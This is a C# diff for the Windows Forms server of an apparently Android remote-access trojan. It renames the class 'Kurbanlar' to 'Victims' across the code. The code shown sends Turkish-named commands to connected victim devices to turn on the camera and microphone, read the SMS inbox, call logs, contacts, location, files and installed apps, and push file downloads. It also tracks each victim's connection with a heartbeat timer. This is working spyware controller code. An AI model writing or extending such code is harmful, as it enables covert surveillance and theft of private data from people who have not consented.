@@ -13,7 +13,7 @@ namespace Server.Views
 {
     public partial class MainWindow : Form
     {
-        List<Kurbanlar> kurban_listesi = new List<Kurbanlar>();
+        List<Victims> kurban_listesi = new List<Victims>();
         Socket soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         public MainWindow()
         {
@@ -134,7 +134,7 @@ namespace Server.Views
         {
             //socettte.NoDelay = true;
             //socettte.ReceiveBufferSize = int.MaxValue; socettte.SendBufferSize = int.MaxValue;
-            kurban_listesi.Add(new Kurbanlar(socettte, idimiz));
+            kurban_listesi.Add(new Victims(socettte, idimiz));
             ListViewItem lvi = new ListViewItem(idimiz);
             lvi.SubItems.Add(makine_ismi);
             lvi.SubItems.Add(socettte.RemoteEndPoint.ToString());
@@ -578,11 +578,11 @@ namespace Server.Views
         FİleManager fmanger;
         private void mesajYollaToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            foreach (Kurbanlar kurban in kurban_listesi)
+            foreach (Victims kurban in kurban_listesi)
             {
                 if (kurban.id == listView1.SelectedItems[0].Text)
                 {
-                    KomutGonder("CAMHAZIRLA", "[VERI][0x09]", kurban.soket);
+                    KomutGonder("CAMHAZIRLA", "[VERI][0x09]", kurban.socket);
                     /*
                     Kamera msj = new Kamera(kurban.soket, kurban.id);
                     msj.Show();
@@ -594,11 +594,11 @@ namespace Server.Views
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                foreach (Kurbanlar kurban in kurban_listesi)
+                foreach (Victims kurban in kurban_listesi)
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("DOSYA", "[VERI][0x09]", kurban.soket);
+                        KomutGonder("DOSYA", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -607,11 +607,11 @@ namespace Server.Views
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                foreach (Kurbanlar kurban in kurban_listesi)
+                foreach (Victims kurban in kurban_listesi)
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        Telefon tlf = new Telefon(kurban.soket, kurban.id);
+                        Telefon tlf = new Telefon(kurban.socket, kurban.id);
                         tlf.Show();
                     }
                 }
@@ -621,11 +621,11 @@ namespace Server.Views
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                foreach (Kurbanlar kurban in kurban_listesi)
+                foreach (Victims kurban in kurban_listesi)
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        Microphone masaustu = new Microphone(kurban.soket);
+                        Microphone masaustu = new Microphone(kurban.socket);
                         masaustu.Show();
                     }
                 }
@@ -635,11 +635,11 @@ namespace Server.Views
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                foreach (Kurbanlar kurban in kurban_listesi)
+                foreach (Victims kurban in kurban_listesi)
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("LOGLARIHAZIRLA", "[VERI][0x09]", kurban.soket);
+                        KomutGonder("LOGLARIHAZIRLA", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -812,11 +812,11 @@ namespace Server.Views
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                foreach (Kurbanlar kurban in kurban_listesi)
+                foreach (Victims kurban in kurban_listesi)
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("GELENKUTUSU", "[VERI][0x09]", kurban.soket);
+                        KomutGonder("GELENKUTUSU", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -825,11 +825,11 @@ namespace Server.Views
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                foreach (Kurbanlar kurban in kurban_listesi)
+                foreach (Victims kurban in kurban_listesi)
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("CALLLOGS", "[VERI][0x09]", kurban.soket);
+                        KomutGonder("CALLLOGS", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -839,11 +839,11 @@ namespace Server.Views
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                foreach (Kurbanlar kurban in kurban_listesi)
+                foreach (Victims kurban in kurban_listesi)
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("VOLUMELEVELS", "[VERI][0x09]", kurban.soket);
+                        KomutGonder("VOLUMELEVELS", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -853,11 +853,11 @@ namespace Server.Views
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                foreach (Kurbanlar kurban in kurban_listesi)
+                foreach (Victims kurban in kurban_listesi)
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("REHBERIVER", "[VERI][0x09]", kurban.soket);
+                        KomutGonder("REHBERIVER", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -867,11 +867,11 @@ namespace Server.Views
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                foreach (Kurbanlar kurban in kurban_listesi)
+                foreach (Victims kurban in kurban_listesi)
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        Entertainment eglence = new Entertainment(kurban.soket, kurban.id);
+                        Entertainment eglence = new Entertainment(kurban.socket, kurban.id);
                         eglence.Show();
                     }
                 }
@@ -881,11 +881,11 @@ namespace Server.Views
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                foreach (Kurbanlar kurban in kurban_listesi)
+                foreach (Victims kurban in kurban_listesi)
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("APPLICATIONS", "[VERI][0x09]", kurban.soket);
+                        KomutGonder("APPLICATIONS", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -895,11 +895,11 @@ namespace Server.Views
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                foreach (Kurbanlar kurban in kurban_listesi)
+                foreach (Victims kurban in kurban_listesi)
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("SARJ", "[VERI][0x09]", kurban.soket);
+                        KomutGonder("SARJ", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -916,11 +916,11 @@ namespace Server.Views
 
         private void konumToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            foreach (Kurbanlar kurban in kurban_listesi)
+            foreach (Victims kurban in kurban_listesi)
             {
                 if (kurban.id == listView1.SelectedItems[0].Text)
                 {
-                    KomutGonder("KONUM", "[VERI][0x09]", kurban.soket);
+                    KomutGonder("KONUM", "[VERI][0x09]", kurban.socket);
                 }
             }
         }
@@ -932,22 +932,22 @@ namespace Server.Views
 
         private void dosyaİndirtToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            foreach (Kurbanlar kurban in kurban_listesi)
+            foreach (Victims kurban in kurban_listesi)
             {
                 if (kurban.id == listView1.SelectedItems[0].Text)
                 {
-                    DownloadManager dwn = new DownloadManager(kurban.soket, kurban.id);
+                    DownloadManager dwn = new DownloadManager(kurban.socket, kurban.id);
                     dwn.Show();
                 }
             }
         }
         private void bağlantıAyarlarıToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            foreach (Kurbanlar kurban in kurban_listesi)
+            foreach (Victims kurban in kurban_listesi)
             {
                 if (kurban.id == listView1.SelectedItems[0].Text)
                 {
-                    new Connection(kurban.soket, kurban.id).Show();
+                    new Connection(kurban.socket, kurban.id).Show();
                 }
             }
         }
@@ -960,21 +960,21 @@ namespace Server.Views
         }
         private void timer1_Tick(object sender, EventArgs e)
         {
-            foreach (Kurbanlar krbn in kurban_listesi.ToList())
+            foreach (Victims krbn in kurban_listesi.ToList())
             {
                 try
                 {
                     byte[] kntrl = Encoding.UTF8.GetBytes("[0x09]KNT[VERI][0x09]<EOF>");
-                    krbn.soket.Send(kntrl, 0, kntrl.Length, SocketFlags.None);
+                    krbn.socket.Send(kntrl, 0, kntrl.Length, SocketFlags.None);
                 }
                 catch (Exception)
                 {
-                    var victim = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == krbn.soket.Handle.ToString()).First();
-                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbn.soket.Handle.ToString() + " kimlik numaralı soket'in bağlantısı kesildi. => " + victim.SubItems[1].Text + "/" + victim.SubItems[2].Text);
+                    var victim = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == krbn.socket.Handle.ToString()).First();
+                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbn.socket.Handle.ToString() + " kimlik numaralı soket'in bağlantısı kesildi. => " + victim.SubItems[1].Text + "/" + victim.SubItems[2].Text);
                     victim.Remove();
-                    kurban_listesi.Where(x => x.id == krbn.soket.Handle.ToString()).First().soket.Close();
-                    kurban_listesi.Where(x => x.id == krbn.soket.Handle.ToString()).First().soket.Dispose();
-                    kurban_listesi.Remove(kurban_listesi.Where(x => x.id == krbn.soket.Handle.ToString()).First());
+                    kurban_listesi.Where(x => x.id == krbn.socket.Handle.ToString()).First().socket.Close();
+                    kurban_listesi.Where(x => x.id == krbn.socket.Handle.ToString()).First().socket.Dispose();
+                    kurban_listesi.Remove(kurban_listesi.Where(x => x.id == krbn.socket.Handle.ToString()).First());
                     toolStripStatusLabel2.Text = "Online: " + listView1.SelectedItems.Count.ToString();
                 }
             }
